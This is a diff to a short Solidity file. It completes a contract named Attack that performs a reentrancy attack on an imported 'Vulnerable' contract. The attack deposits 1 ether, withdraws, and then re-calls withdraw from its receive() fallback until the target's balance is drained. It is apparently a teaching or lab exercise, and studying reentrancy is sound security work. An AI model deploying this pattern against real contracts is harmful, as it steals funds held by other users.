@@ -1,20 +1,23 @@
 // SPDX-License-Identifier: MIT 
 
-pragma solidity >=0.5.0 <0.9.0;
-
+pragma solidity ^0.8.8 ;
 import "./Vulnerable.sol";
 
-contract vulnerable{
-    Vulnerable public vuln; 
+contract Attack{
+    Vulnerable public vulnerable; 
+
+    constructor(address vulnerableAddress){
+        vulnerable = Vulnerable(vulnerableAddress);
+    }
 
     function attack() external payable{
-        vulnerable.deposit{value:1}("");
+        vulnerable.deposit{value:1 ether}();
         vulnerable.withdraw();
     }
 
     receive() external payable{
-        if(address(vuln).balances >=1 ether){
-            vuln.withdraw();
+        if(address(vulnerable).balance >=1 ether){
+            vulnerable.withdraw();
         }
     }
 }
